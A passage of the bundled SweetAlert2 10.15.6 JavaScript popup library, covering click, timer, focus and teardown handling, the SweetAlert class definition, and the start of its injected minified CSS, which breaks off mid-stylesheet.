  var handleToastClick = function handleToastClick(instance, domCache, dismissWith) {
    // Closing toast by internal click
    domCache.popup.onclick = function () {
      var innerParams = privateProps.innerParams.get(instance);

      if (innerParams.showConfirmButton || innerParams.showDenyButton || innerParams.showCancelButton || innerParams.showCloseButton || innerParams.timer || innerParams.input) {
        return;
      }

      dismissWith(DismissReason.close);
    };
  };

  var ignoreOutsideClick = false;

  var handleModalMousedown = function handleModalMousedown(domCache) {
    domCache.popup.onmousedown = function () {
      domCache.container.onmouseup = function (e) {
        domCache.container.onmouseup = undefined; // We only check if the mouseup target is the container because usually it doesn't
        // have any other direct children aside of the popup

        if (e.target === domCache.container) {
          ignoreOutsideClick = true;
        }
      };
    };
  };

  var handleContainerMousedown = function handleContainerMousedown(domCache) {
    domCache.container.onmousedown = function () {
      domCache.popup.onmouseup = function (e) {
        domCache.popup.onmouseup = undefined; // We also need to check if the mouseup target is a child of the popup

        if (e.target === domCache.popup || domCache.popup.contains(e.target)) {
          ignoreOutsideClick = true;
        }
      };
    };
  };

  var handleModalClick = function handleModalClick(instance, domCache, dismissWith) {
    domCache.container.onclick = function (e) {
      var innerParams = privateProps.innerParams.get(instance);

      if (ignoreOutsideClick) {
        ignoreOutsideClick = false;
        return;
      }

      if (e.target === domCache.container && callIfFunction(innerParams.allowOutsideClick)) {
        dismissWith(DismissReason.backdrop);
      }
    };
  };

  function _main(userParams) {
    var mixinParams = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
    showWarningsForParams(_extends({}, mixinParams, userParams));

    if (globalState.currentInstance) {
      globalState.currentInstance._destroy();
    }

    globalState.currentInstance = this;
    var innerParams = prepareParams(userParams, mixinParams);
    setParameters(innerParams);
    Object.freeze(innerParams); // clear the previous timer

    if (globalState.timeout) {
      globalState.timeout.stop();
      delete globalState.timeout;
    } // clear the restore focus timeout


    clearTimeout(globalState.restoreFocusTimeout);
    var domCache = populateDomCache(this);
    render(this, innerParams);
    privateProps.innerParams.set(this, innerParams);
    return swalPromise(this, domCache, innerParams);
  }

  var prepareParams = function prepareParams(userParams, mixinParams) {
    var templateParams = getTemplateParams(userParams);

    var showClass = _extends({}, defaultParams.showClass, mixinParams.showClass, templateParams.showClass, userParams.showClass);

    var hideClass = _extends({}, defaultParams.hideClass, mixinParams.hideClass, templateParams.hideClass, userParams.hideClass);

    var params = _extends({}, defaultParams, mixinParams, templateParams, userParams); // precedence is described in #2131


    params.showClass = showClass;
    params.hideClass = hideClass; // @deprecated

    if (userParams.animation === false) {
      params.showClass = {
        popup: 'swal2-noanimation',
        backdrop: 'swal2-noanimation'
      };
      params.hideClass = {};
    }

    return params;
  };

  var swalPromise = function swalPromise(instance, domCache, innerParams) {
    return new Promise(function (resolve) {
      // functions to handle all closings/dismissals
      var dismissWith = function dismissWith(dismiss) {
        instance.closePopup({
          isDismissed: true,
          dismiss: dismiss
        });
      };

      privateMethods.swalPromiseResolve.set(instance, resolve);

      domCache.confirmButton.onclick = function () {
        return handleConfirmButtonClick(instance, innerParams);
      };

      domCache.denyButton.onclick = function () {
        return handleDenyButtonClick(instance, innerParams);
      };

      domCache.cancelButton.onclick = function () {
        return handleCancelButtonClick(instance, dismissWith);
      };

      domCache.closeButton.onclick = function () {
        return dismissWith(DismissReason.close);
      };

      handlePopupClick(instance, domCache, dismissWith);
      addKeydownHandler(instance, globalState, innerParams, dismissWith);

      if (innerParams.toast && (innerParams.input || innerParams.footer || innerParams.showCloseButton)) {
        addClass(document.body, swalClasses['toast-column']);
      } else {
        removeClass(document.body, swalClasses['toast-column']);
      }

      handleInputOptionsAndValue(instance, innerParams);
      openPopup(innerParams);
      setupTimer(globalState, innerParams, dismissWith);
      initFocus(domCache, innerParams); // Scroll container to top on open (#1247, #1946)

      setTimeout(function () {
        domCache.container.scrollTop = 0;
      });
    });
  };

  var populateDomCache = function populateDomCache(instance) {
    var domCache = {
      popup: getPopup(),
      container: getContainer(),
      content: getContent(),
      actions: getActions(),
      confirmButton: getConfirmButton(),
      denyButton: getDenyButton(),
      cancelButton: getCancelButton(),
      loader: getLoader(),
      closeButton: getCloseButton(),
      validationMessage: getValidationMessage(),
      progressSteps: getProgressSteps()
    };
    privateProps.domCache.set(instance, domCache);
    return domCache;
  };

  var setupTimer = function setupTimer(globalState$$1, innerParams, dismissWith) {
    var timerProgressBar = getTimerProgressBar();
    hide(timerProgressBar);

    if (innerParams.timer) {
      globalState$$1.timeout = new Timer(function () {
        dismissWith('timer');
        delete globalState$$1.timeout;
      }, innerParams.timer);

      if (innerParams.timerProgressBar) {
        show(timerProgressBar);
        setTimeout(function () {
          if (globalState$$1.timeout && globalState$$1.timeout.running) {
            // timer can be already stopped or unset at this point
            animateTimerProgressBar(innerParams.timer);
          }
        });
      }
    }
  };

  var initFocus = function initFocus(domCache, innerParams) {
    if (innerParams.toast) {
      return;
    }

    if (!callIfFunction(innerParams.allowEnterKey)) {
      return blurActiveElement();
    }

    if (!focusButton(domCache, innerParams)) {
      setFocus(innerParams, -1, 1);
    }
  };

  var focusButton = function focusButton(domCache, innerParams) {
    if (innerParams.focusDeny && isVisible(domCache.denyButton)) {
      domCache.denyButton.focus();
      return true;
    }

    if (innerParams.focusCancel && isVisible(domCache.cancelButton)) {
      domCache.cancelButton.focus();
      return true;
    }

    if (innerParams.focusConfirm && isVisible(domCache.confirmButton)) {
      domCache.confirmButton.focus();
      return true;
    }

    return false;
  };

  var blurActiveElement = function blurActiveElement() {
    if (document.activeElement && typeof document.activeElement.blur === 'function') {
      document.activeElement.blur();
    }
  };

  /**
   * Updates popup parameters.
   */

  function update(params) {
    var popup = getPopup();
    var innerParams = privateProps.innerParams.get(this);

    if (!popup || hasClass(popup, innerParams.hideClass.popup)) {
      return warn("You're trying to update the closed or closing popup, that won't work. Use the update() method in preConfirm parameter or show a new popup.");
    }

    var validUpdatableParams = {}; // assign valid params from `params` to `defaults`

    Object.keys(params).forEach(function (param) {
      if (Swal.isUpdatableParameter(param)) {
        validUpdatableParams[param] = params[param];
      } else {
        warn("Invalid parameter to update: \"".concat(param, "\". Updatable params are listed here: https://github.com/sweetalert2/sweetalert2/blob/master/src/utils/params.js\n\nIf you think this parameter should be updatable, request it here: https://github.com/sweetalert2/sweetalert2/issues/new?template=02_feature_request.md"));
      }
    });

    var updatedParams = _extends({}, innerParams, validUpdatableParams);

    render(this, updatedParams);
    privateProps.innerParams.set(this, updatedParams);
    Object.defineProperties(this, {
      params: {
        value: _extends({}, this.params, params),
        writable: false,
        enumerable: true
      }
    });
  }

  function _destroy() {
    var domCache = privateProps.domCache.get(this);
    var innerParams = privateProps.innerParams.get(this);

    if (!innerParams) {
      return; // This instance has already been destroyed
    } // Check if there is another Swal closing


    if (domCache.popup && globalState.swalCloseEventFinishedCallback) {
      globalState.swalCloseEventFinishedCallback();
      delete globalState.swalCloseEventFinishedCallback;
    } // Check if there is a swal disposal defer timer


    if (globalState.deferDisposalTimer) {
      clearTimeout(globalState.deferDisposalTimer);
      delete globalState.deferDisposalTimer;
    }

    runDidDestroy(innerParams);
    disposeSwal(this);
  }

  var runDidDestroy = function runDidDestroy(innerParams) {
    if (typeof innerParams.didDestroy === 'function') {
      innerParams.didDestroy();
    } else if (typeof innerParams.onDestroy === 'function') {
      innerParams.onDestroy(); // @deprecated
    }
  };

  var disposeSwal = function disposeSwal(instance) {
    // Unset this.params so GC will dispose it (#1569)
    delete instance.params; // Unset globalState props so GC will dispose globalState (#1569)

    delete globalState.keydownHandler;
    delete globalState.keydownTarget; // Unset WeakMaps so GC will be able to dispose them (#1569)

    unsetWeakMaps(privateProps);
    unsetWeakMaps(privateMethods);
  };

  var unsetWeakMaps = function unsetWeakMaps(obj) {
    for (var i in obj) {
      obj[i] = new WeakMap();
    }
  };



  var instanceMethods = /*#__PURE__*/Object.freeze({
    hideLoading: hideLoading,
    disableLoading: hideLoading,
    getInput: getInput$1,
    close: close,
    closePopup: close,
    closeModal: close,
    closeToast: close,
    enableButtons: enableButtons,
    disableButtons: disableButtons,
    enableInput: enableInput,
    disableInput: disableInput,
    showValidationMessage: showValidationMessage,
    resetValidationMessage: resetValidationMessage$1,
    getProgressSteps: getProgressSteps$1,
    _main: _main,
    update: update,
    _destroy: _destroy
  });

  var currentInstance;

  var SweetAlert = /*#__PURE__*/function () {
    function SweetAlert() {
      _classCallCheck(this, SweetAlert);

      // Prevent run in Node env
      if (typeof window === 'undefined') {
        return;
      } // Check for the existence of Promise


      if (typeof Promise === 'undefined') {
        error('This package requires a Promise library, please include a shim to enable it in this browser (See: https://github.com/sweetalert2/sweetalert2/wiki/Migration-from-SweetAlert-to-SweetAlert2#1-ie-support)');
      }

      currentInstance = this;

      for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
        args[_key] = arguments[_key];
      }

      var outerParams = Object.freeze(this.constructor.argsToParams(args));
      Object.defineProperties(this, {
        params: {
          value: outerParams,
          writable: false,
          enumerable: true,
          configurable: true
        }
      });

      var promise = this._main(this.params);

      privateProps.promise.set(this, promise);
    } // `catch` cannot be the name of a module export, so we define our thenable methods here instead


    _createClass(SweetAlert, [{
      key: "then",
      value: function then(onFulfilled) {
        var promise = privateProps.promise.get(this);
        return promise.then(onFulfilled);
      }
    }, {
      key: "finally",
      value: function _finally(onFinally) {
        var promise = privateProps.promise.get(this);
        return promise["finally"](onFinally);
      }
    }]);

    return SweetAlert;
  }(); // Assign instance methods from src/instanceMethods/*.js to prototype


  _extends(SweetAlert.prototype, instanceMethods); // Assign static methods from src/staticMethods/*.js to constructor


  _extends(SweetAlert, staticMethods); // Proxy to instance methods to constructor, for now, for backwards compatibility


  Object.keys(instanceMethods).forEach(function (key) {
    SweetAlert[key] = function () {
      if (currentInstance) {
        var _currentInstance;

        return (_currentInstance = currentInstance)[key].apply(_currentInstance, arguments);
      }
    };
  });
  SweetAlert.DismissReason = DismissReason;
  SweetAlert.version = '10.15.6';

  var Swal = SweetAlert;
  Swal["default"] = Swal;

  return Swal;

}));
if (typeof this !== 'undefined' && this.Sweetalert2){  this.swal = this.sweetAlert = this.Swal = this.SweetAlert = this.Sweetalert2}

"undefined"!=typeof document&&function(e,t){var n=e.createElement("style");if(e.getElementsByTagName("head")[0].appendChild(n),n.styleSheet)n.styleSheet.disabled||(n.styleSheet.cssText=t);else try{n.innerHTML=t}catch(e){n.innerText=t}}(document,".swal2-popup.swal2-toast{flex-direction:row;align-items:center;width:auto;padding:.625em;overflow-y:hidden;background:#fff;box-shadow:0 0 .625em #d9d9d9}.swal2-popup.swal2-toast .swal2-header{flex-direction:row;padding:0}.swal2-popup.swal2-toast .swal2-title{flex-grow:1;justify-content:flex-start;margin:0 .6em;font-size:1em}.swal2-popup.swal2-toast .swal2-footer{margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-popup.swal2-toast .swal2-close{position:static;width:.8em;height:.8em;line-height:.8}.swal2-popup.swal2-toast .swal2-content{justify-content:flex-start;padding:0;font-size:1em}.swal2-popup.swal2-toast .swal2-icon{width:2em;min-width:2em;height:2em;margin:0}.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:700}@media all and (-ms-high-contrast:none),(-ms-high-contrast:active){.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{font-size:.25em}}.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-popup.swal2-toast .swal2-actions{flex-basis:auto!important;width:auto;height:auto;margin:0 .3125em;padding:0}.swal2-popup.swal2-toast .swal2-styled{margin:.125em .3125em;padding:.3125em .625em;font-size:1em}.swal2-popup.swal2-toast .swal2-styled:focus{box-shadow:0 0 0 1px #fff,0 0 0 3px rgba(100,150,200,.5)}.swal2-popup.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;transform:rotate(45deg);border-radius:50%}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-.8em;left:-.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-popup.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{-webkit-animation:swal2-toast-animate-success-line-tip .75s;animation:swal2-toast-animate-success-line-tip .75s}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{-webkit-animation:swal2-toast-animate-success-line-long .75s;animation:swal2-toast-animate-success-line-long .75s}.swal2-popup.swal2-toast.swal2-show{-webkit-animation:swal2-toast-show .5s;animation:swal2-toast-show .5s}.swal2-popup.swal2-toast.swal2-hide{-webkit-animation:swal2-toast-hide .1s forwards;animation:swal2-toast-hide .1s forwards}.swal2-container{display:flex;position:fixed;z-index:1060;top:0;right:0;bottom:0;left:0;flex-direction:row;align-items:center;justify-content:center;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}.swal2-container.swal2-backdrop-show,.swal2-container.swal2-noanimation{background:rgba(0,0,0,.4)}.swal2-container.swal2-backdrop-hide{background:0 0!important}.swal2-container.swal2-top{align-items:flex-start}.swal2-container.swal2-top-left,.swal2-container.swal2-top-start{align-items:flex-start;justify-content:flex-start}.swal2-container.swal2-top-end,.swal2-container.swal2-top-right{align-items:flex-start;justify-content:flex-end}.swal2-container.swal2-center{align-items:center}.swal2-container.swal2-center-left,.swal2-container.swal2-center-start{align-items:center;justify-content:flex-start}.swal2-container.swal2-center-end,.swal2-container.swal2-center-right{align-items:center;justify-content:flex-end}.swal2-container.swal2-bottom{align-items:flex-end}.swal2-container.swal2-bottom-left,.swal2-container.swal2-bottom-start{align-items:flex-end;justify-content:flex-start}.swal2-container.swal2-bottom-end,.swal2-container.swal2-bottom-right{align-items:flex-end;justify-content:flex-end}.swal2-container.swal2-bottom-end>:first-child,.swal2-container.swal2-bottom-left>:first-child,.swal2-container.swal2-bottom-right>:first-child,.swal2-container.swal2-bottom-start>:first-child,.swal2-container.swal2-bottom>:first-child{margin-top:auto}.swal2-container.swal2-grow-fullscreen>.swal2-modal{display:flex!important;flex:1;align-self:stretch;justify-content:center}.swal2-container.swal2-grow-row>.swal2-modal{display:flex!important;flex:1;align-content:center;justify-content:center}.swal2-container.swal2-grow-column{flex:1;flex-direction:column}.swal2-container.swal2-grow-column.swal2-bottom,.swal2-container.swal2-grow-column.swal2-center,.swal2-container.swal2-grow-column.swal2-top{align-items:center}.swal2-container.swal2-grow-column.swal2-bottom-left,.swal2-container.swal2-grow-column.swal2-bottom-start,.swal2-container.swal2-grow-column.swal2-center-left,.swal2-container.swal2-grow-column.swal2-center-start,.swal2-container.swal2-grow-column.swal2-top-left,.swal2-container.swal2-grow-column.swal2-top-start{align-items:flex-start}.swal2-container.swal2-grow-column.swal2-bottom-end,.swal2-container.swal2-grow-column.swal2-bottom-right,.swal2-container.swal2-grow-column.swal2-center-end,.swal2-container.swal2-grow-column.swal2-center-right,.swal2-container.swal2-grow-column.swal2-top-end,.swal2-container.swal2-grow-column.swal2-top-right{align-items:flex-end}.swal2-container.swal2-grow-column>.swal2-modal{display:flex!important;flex:1;align-content:center;justify-content:center}.swal2-container.swal2-no-transition{transition:none!important}.swal2-container:not(.swal2-top):not(.swal2-top-start):not(.swal2-top-end):not(.swal2-top-left):not(.swal2-top-right):not(.swal2-center-start):not(.swal2-center-end):not(.swal2-center-left):not(.swal2-center-right):not(.swal2-bottom):not(.swal2-bottom-start):not(.swal2-bottom-end):not(.swal2-bottom-left):not(.swal2-bottom-right):not(.swal2-grow-fullscreen)>.swal2-modal{margin:auto}@media all and (-ms-high-contrast:none),(-ms-high-contrast:active){.swal2-container .swal2-modal{margin:0!important}}.swal2-popup{display:none;position:relative;box-sizing:border-box;flex-direction:column;justify-content:center;width:32em;max-width:100%;padding:1.25em;border:none;border-radius:5px;background:#fff;font-family:inherit;font-size:1rem}.swal2-popup:focus{outline:0}.swal2-popup.swal2-loading{overflow-y:hidden}.swal2-header{display:flex;flex-direction:column;align-items:center;padding:0 1.8em}.swal2-title{position:relative;max-width:100%;margin:0 0 .4em;padding:0;color:#595959;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word}.swal2-actions{display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:center;width:100%;margin:1.25em auto 0;padding:0 1.6em}.swal2-actions:not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}.swal2-actions:not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0,0,0,.1),rgba(0,0,0,.1))}.swal2-actions:not(.swal2-loading) .swal2-styled:active{background-image:linear-gradient(rgba(0,0,0,.2),rgba(0,0,0,.2))}.swal2-loader{display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;-webkit-animation:swal2-rotate-loading 1.5s linear 0s infinite normal;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 transparent #2778c4 transparent}.swal2-styled{margin:.3125em;padding:.625em 1.1em;box-shadow:none;font-weight:500}.swal2-styled:not([disabled]){cursor:pointer}.swal2-styled.swal2-confirm{border:0;border-radius:.25em;background:initial;background-color:#2778c4;color:#fff;font-size:1.0625em}.swal2-styled.swal2-deny{border:0;border-radius:.25em;background:initial;background-color:#d14529;color:#fff;font-size:1.0625em}.swal2-styled.swal2-cancel{border:0;border-radius:.25em;background:initial;background-color:#757575;color:#fff;font-size:1.0625em}.swal2-styled:focus{outline:0;box-shadow:0 0 0 3px rgba(100,150,200,.5)}.swal2-styled::-moz-focus-inner{border:0}.swal2-footer{justify-content:center;margin:1.25em 0 0;padding:1em 0 0;border-top:1px solid #eee;color:#545454;font-size:1em}.swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;height:.25em;overflow:hidden;border-bottom-right-radius:5px;border-bottom-left-radius:5px}.swal2-timer-progress-bar{width:100%;height:.25em;background:rgba(0,0,0,.2)}.swal2-image{max-width:100%;margin:1.25em auto}.swal2-close{position:absolute;z-index:2;top:0;right:0;align-items:center;justify-content:center;width:1.2em;height:1.2em;padding:0;overflow:hidden;transition:color .1s ease-out;border:none;border-radius:5px;background:0 0;color:#ccc;font-family:serif;font-size:2.5em;line-height:1.2;cursor:pointer}.swal2-close:hover{transform:none;background:0 0;color:#f27474}.swal2-close:focus{outline:0;box-shadow:inset 0 0 0 3px rgba(100,150,200,.5)}.swal2-close::-moz-focus-inner{border:0}.swal2-content{z-index:1;justify-content:center;margin:0;padding:0 1.6em;color:#545454;font-size:1.125em;font-weight:400;line-height:normal;text-align:center;word-wrap:break-word}.swal2-checkbox,.swal2-file,.swal2-input,.swal2-radio,.swal2-select,.swal2-textarea{margin:1em auto}.swal2-file,.swal2-input,.swal2-textarea{box-sizing:border-box;width:100%;transition:border-color .3s,box-shadow .3s;border:1px solid #d9d9d9;border-radius:.1875em;background:inherit;box-shadow:inset 0 1px 1px rgba(0,0,0,.06);color:inherit;font-size:1.125em}.swal2-file.swal2-inputerror,.swal2-input.swal2-inputerror,.swal2-textarea.swal2-inputerror{border-color:#f27474!important;box-shadow:0 0 2px #f27474!important}.swal2-file:focus,.swal2-input:focus,.swal2-textarea:focus{border:1px solid #b4dbed;outline:0;box-shadow:0 0 0 3px rgba(100,150,200,.5)}.swal2-file::-moz-placeholder,.swal2-input::-moz-placeholder,.swal2-textarea::-moz-placeholder{color:#ccc}.swal2-file:-ms-input-placeholder,.swal2-input:-ms-input-placeholder,.swal2-textarea:-ms-input-placeholder{color:#ccc}.swal2-file::placeholder,.swal2-input::placeholder,.swal2-textarea::placeholder{color:#ccc}.swal2-range{margin:1em auto;background:#fff}.swal2-range input{width:80%}.swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}.swal2-range input,.swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}.swal2-input{height:2.625em;padding:0 .75em}.swal2-input[type=number]{max-width:10em}.swal2-file{background:inherit;font-size:1.125em}.swal2-textarea{height:6.75em;padding:.75em}.swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:inherit;color:inherit;font-size:1.125em}.swal2-checkbox,.swal2-radio{align-items:center;justify-content:center;background:#fff;color:inherit}.swal2-checkbox label,.swal2-radio label{margin:0 .6em;font-size:1.125em}.swal2-checkbox input,.swal2-radio input{margin:0 .4em}.swal2-input-label{display:flex;justify-content:center;margin:1em auto}.swal2-validation-message{align-items:center;justify-content:center;margin:0 -2.7em;padding:.625em;overflow:hidden;background:#f0f0f0;color:#666;font-size:1em;font-weight:300}.swal2-validation-message::before{content:\"!\";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}.swal2-icon{position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:1.25em auto 1.875em;border:.25em solid transparent;border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}.swal2-icon.swal2-error{border-color:#f27474;color:#f27474}.swal2-icon.swal2-error .swal2-x-mark{position:relative;flex-grow:1}.swal2-icon.swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}.swal2-icon.swal2-error.swal2-icon-show{-webkit-animation:swal2-animate-error-icon .5s;animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-error.swal2-icon-show .swal2-x-mark{-webkit-animation:swal2-animate-error-x-mark .5s;animation:swal2-animate-error-x-mark .5s}.swal2-icon.swal2-warning{border-color:#facea8;color:#f8bb86}.swal2-icon.swal2-info{border-color:#9de0f6;color:#3fc3ee}.swal2-icon.swal2-question{border-color:#c9dae1;color:#87adbd}.swal2-icon.swal2-success{border-color:#a5dc86;color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;transform:rotate(45deg);border-radius:50%}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=left]{top:-.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=right]{top:-.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}.swal2-icon.swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-.25em;left:-.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}.swal2-icon.swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}.swal2-icon.swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}.swal2-icon.swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-tip{-webkit-animation:swal2-animate-success-line-tip .75s;animation:swal2-animate-success-line-tip .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-long{-webkit-animation:swal2-animate-success-line-long .75s;animation:swal2-animate-success-line-long .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-circular-line-right{-webkit-animation:swal2-rotate-success-circular-line 4.25s ease-in;animation:swal2-rotate-success-circular-line 4.25s ease-in}.swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:0 0 1.25em;padding:0;background:inherit;font-weight:600}.swal2-progress-steps li{display:inline-block;position:relative}.swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:#add8e6;color:#fff}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:#add8e6}.swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}[class^=swal2]{-webkit-tap-highlight-color:transparent}.swal2-show{-webkit-animation:swal2-show .3s;animation:swal2-show .3s}.swal2-hide{-webkit-animation:swal2-hide .15s forwards;animation:swal2-hide .15s forwards}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{right:auto;left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}@supports (-ms-accelerator:true){.swal2-range input{width:100%!important}.swal2-range output{display:none}}@media all and (-ms-high-contrast:none),(-ms-high-contrast:active){.swal2-range input{width:100%!important}.swal2-range output{display:none}}@-webkit-keyframes swal2-toast-show{0%{transform:translateY(-.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0)}}@keyframes swal2-toast-show{0%{transform:translateY(-.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0)}}@-webkit-keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@-webkit-keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@-webkit-keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@-webkit-keyframes swal2-show{0%{transform:scale(.7)}45%{transform:scale(1.05)}80%{transform:scale(.95)}100%{transform:scale(1)}}@keyframes swal2-show{0%{transform:scale(.7)}45%{transform:scale(1.05)}80%{transform:scale(.95)}100%{transform:scale(1)}}@-webkit-keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(.5);opacity:0}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(.5);opacity:0}}@-webkit-keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@-webkit-keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@-webkit-keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes 